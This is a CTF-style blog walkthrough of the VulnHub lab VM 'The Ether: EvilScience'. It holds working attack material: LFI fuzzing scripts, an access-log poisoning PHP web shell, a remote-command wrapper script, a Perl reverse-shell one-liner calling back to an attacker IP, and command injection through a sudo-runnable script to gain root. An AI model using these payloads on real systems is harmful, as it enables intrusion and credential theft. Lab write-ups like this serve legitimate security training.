---
layout: post
title: "This Isn't Bad Science. It's Evil Science"
comments: true
category: walkthrough
tags: [vulnhub, "The Ether"]
---

**Spoiler Alert**  
This post documents the complete walkthrough of The Ether: EvilScience, a boot2root [VM][1] hosted at [VulnHub][2]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
A mysterious company, _The Ether_ has proclaimed an elixir that considerably alters human welfare. The CDC has become suspicious of this group due to the nature of the product they are developing. The goal is to find out what _The Ether_ is up to.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in **theEther**.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
|_  256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: The Ether
```

As usual, let's start with the web service. Here's what I see in the browser when I navigate to it.

![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"} 
![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-3.png){: style="display: block"}

Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I can work with.

```
# curl -s 192.168.198.130 | grep -Eo '(src\=\".*\"|href\=\".*\")' | cut -d'"' -f2
```
```
http://www.os-templates.com/
layout/styles/layout.css
index.php
?file=about.php
?file=research.php
#
#
http://www.os-templates.com/
#top
layout/scripts/jquery.min.js
layout/scripts/jquery.backtotop.js
layout/scripts/jquery.mobilemenu.js
layout/scripts/jquery.flexslider-min.js
```

Among the hyperlinks, two of them stood out immediately: `?file=about.php` and `?file=research.php`. Could this be a LFI  vulnerability? We shall see.

### Directory/File Enumeration

Let's enumerate the site with `dirbuster` and see what we get.

![dirbuster](/assets/images/posts/evilscience-walkthrough/evilscience-2.png)

```
Dir found: / - 200
Dir found: /images/ - 200
Dir found: /layout/ - 200
Dir found: /layout/scripts/ - 200
Dir found: /icons/ - 403
Dir found: /server-status/ - 403
File found: /about.php - 200
File found: /index.php - 200
File found: /layout/scripts/jquery.backtotop.js - 200
File found: /layout/scripts/jquery.flexslider-min.js - 200
File found: /layout/scripts/jquery.min.js - 200
File found: /layout/scripts/jquery.mobilemenu.js - 200
File found: /research.php - 200
```

The same two pages were found: `/about.php` and `/research.php`.

Navigating to `/?file=about.php`, I noticed that the content of `/about.php` was included twice before the content of `/index.php`.

OK. Now I'm positive there is a LFI vulnerability with the `file` parameter.

### Mapping of DocumentRoot

I've tried the following common LFI attacks with no success:

* `/etc/passwd`
* `/var/log/apache2/access.log`
* `/proc/self/environ`
* `php://filter`
* `php://include`

However, I had success displaying the content of `/usr/share/apache2/icons/README` like so.

![README](/assets/images/posts/evilscience-walkthrough/evilscience-5.png)

![README](/assets/images/posts/evilscience-walkthrough/evilscience-6.png)

This would means that absolute path is allowed but some kind of filtering for common LFI attacks is in place. It also means that the [**DocumentRoot**][3]{: target='_blank'} is not your usual `/var/www/html`. :sweat:

Here's what I imagined the PHP code in `/index.php` looked like.

```php
<?php
    $file = $_GET["file"];
    if (preg_match("/(etc|proc|var|php:)/", $file)) {
        include("/index.php");
    } else {
        include($file);
        include($file);
    }
?>
```

To that end, I wrote `fuzz.sh` in combination with the various wordlists from [SecLists][4]{: target='_blank'} to map out the **DocumentRoot** by exploiting the `file` parameter. For this to work, a unique known string in the file must exists.

```bash
# cat fuzz.sh
#!/bin/bash

HOST=192.168.198.130
PATTERN="$1"
KNOWN="$2"
WORDLIST="$3"

for word in $(cat "$WORDLIST"); do
    echo "[+] Trying ${PATTERN/FUZZ/$word}"
    if curl -s http://${HOST}/?file=${PATTERN/FUZZ/$word} | grep -E "$KNOWN" &>/dev/null; then
        echo
        echo "[!] Found: http://${HOST}/?file=${PATTERN/FUZZ/$word}"
        break;
    fi
done
```

Now, let's give `fuzz.sh` a shot.

```
# ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
```
```
...
[+] Trying ../pub/about.php
[+] Trying ../public/about.php
[+] Trying ../public_ftp/about.php
[+] Trying ../public_html/about.php

[!] Found: http://192.168.198.130/?file=../public_html/about.php
```

Navigating to `/?file=../public_html/about.php` gave me the confidence the script is working.

![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)

Moving up the next level got me stuck for hours. Not knowing how to move forward, I chanced upon **theether.com** at the footer. 

![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)

Using that as base, I created a custom wordlist with `python`.

```python
# cat crunch.py
#!/usr/bin/env python

import itertools
import sys

s = sys.argv[1]

for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
    print word

#./crunch.py theether.com > custom.txt
```

Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.

```
# ./brute.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
```
```
...
[+] Trying ../../theeTHER.CoM/public_html/about.php
[+] Trying ../../theeTHER.COm/public_html/about.php
[+] Trying ../../theeTHER.COM/public_html/about.php
[+] Trying ../../theEther.com/public_html/about.php

[!] Found: http://192.168.198.130/?file=../../theEther.com/public_html/about.php
```

With the rest of the higher levels mapped out fairly easy with the `common.txt` wordlist from SecLists, the **DocumentRoot** was finally determined to be: `/var/www/html/theEther.com/public_html`

![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)

Sweet!

### Access Log

Since I can't access the default `/var/log/apache2/access.log`, there is a possibility that the access log could be defined elsewhere, perhaps even somewhere near.

Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this location.

```
# ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
```
```
...
[+] Trying /var/www/html/theEther.com/log.sqlite
[+] Trying /var/www/html/theEther.com/log.txt
[+] Trying /var/www/html/theEther.com/log/
[+] Trying /var/www/html/theEther.com/log/access.log

[!] Found: http://192.168.198.130/?file=/var/www/html/theEther.com/log/access.log
```

### LFI to Shell

Now that I've found `access.log`, I can corrupt it by sending PHP code through `netcat`.

```
# nc 192.168.198.130 80
```
```
<pre><?php echo shell_exec($_GET['cmd']);?></pre>
HTTP/1.1 400 Bad Request
Date: Thu, 08 Feb 2018 20:22:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 304
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at theEther.com Port 80</address>
</body></html>
```

With this in mind, I wrote another script to clean up the output from the remote command execution.

```bash
# cat cmd.sh
#!/bin/bash

HOST=192.168.198.130
ACCESS=/var/www/html/theEther.com/log/access.log
CMD="$@"

function urlencode() {
    echo -n "$1" | xxd -p | sed -r 's/(..)/%\1/g'
}

while getopts ":e" opt; do
    case $opt in
        e)
            shift 1
            CMD=$(urlencode "$@")
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            ;;
    esac
done

curl \
    -s \
    "http://$HOST/?cmd=$CMD&file=$ACCESS" | \
sed -nr '/<pre>/,/<\/pre>/p;/<\/pre>/q' | \
sed -e 's/.*<pre>//g' -e 's/<\/pre>.*//g' | \
sed '$d'
```

Let's give it a shot.

```
# ./cmd.sh -e "cat /etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
evilscience:x:1000:1000:evilscience,,,:/home/evilscience:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

Also, not quite the PHP code I imagined but close.

```php
# ./cmd.sh -e "cat index.php"
<?php
    $file = $_GET["file"];

    $file = str_ireplace("etc","", $file);
    $file = str_ireplace("php:","", $file);
    $file = str_ireplace("expect:","", $file);
    $file = str_ireplace("data:","", $file);
    $file = str_ireplace("proc","", $file);
    $file = str_ireplace("home","", $file);
    $file = str_ireplace("opt","", $file);

if ($file == "/var/log/auth.log") {
    header("location: index.php");
} else {
    include($file);
}
    include($file);
?>
```

Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system.

```perl
perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
```

To avoid complications, it's best to `urlencode()` the above and then spawn a pseudo-tty for optimal output control.

![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)

I got shell!

### Privilege Escalation

During enumeration, I noticed that user `evilscience` was able to `sudo` as `root` as shown by `.sudo_as_admin_successful`.

![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)

Interestingly, there was also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy? 11MB for a Python file? Something funky is going on here!

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)

Finally, `www-data` had some pretty interesting permissions going on as well.

![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-12.png)

In any case, let's run `xxxlogauditorxxx.py` and see what I'm up against.

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-13.png)

It appeared to be displaying the content of the chosen log file.

_For `/var/log/auth.log`_

![auth.log](/assets/images/posts/evilscience-walkthrough/evilscience-15.png)

_For `/var/log/apache2/access.log`_

![access.log](/assets/images/posts/evilscience-walkthrough/evilscience-14.png)

So, `cat` was used to display the content of the files. Recall from above that `www-data` was able to run `xxxlogauditorxxx.py` as `root` without password?

Armed with this new knowledge that `cat` was used, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.

![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)

Holy smoke. It worked!

My guess is that the command ran like this.

```
cat /var/log/auth.log /etc/shadow
```

I can possibly use command substitution with backticks or `$()` to execute a another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.

![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)

![nc](/assets/images/posts/evilscience-walkthrough/evilscience-18.png)

Time to test my hypothesis!

![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-21.png)

![root](/assets/images/posts/evilscience-walkthrough/evilscience-19.png)

:dancer:

### Getting to Bikini Bottom :bikini:

There was a PNG file `flag.png` in `/root` that looked like this.

![flag.png](/assets/images/posts/evilscience-walkthrough/flag.png)

There was a long `base64` encoded string appended to the end of the file like so.

![base64](/assets/images/posts/evilscience-walkthrough/evilscience-20.png)

Finally, the cat is out of the bag!

```
# strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d
```
<pre class="wrap">
October 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
</pre>

### Afternote

_Not for the feint of heart_ :broken_heart:

[1]: https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
[2]: https://www.vulnhub.com/
[3]: https://httpd.apache.org/docs/2.4/mod/core.html#documentroot
[4]: https://github.com/danielmiessler/SecLists

*[LFI]: Local File Inclusion
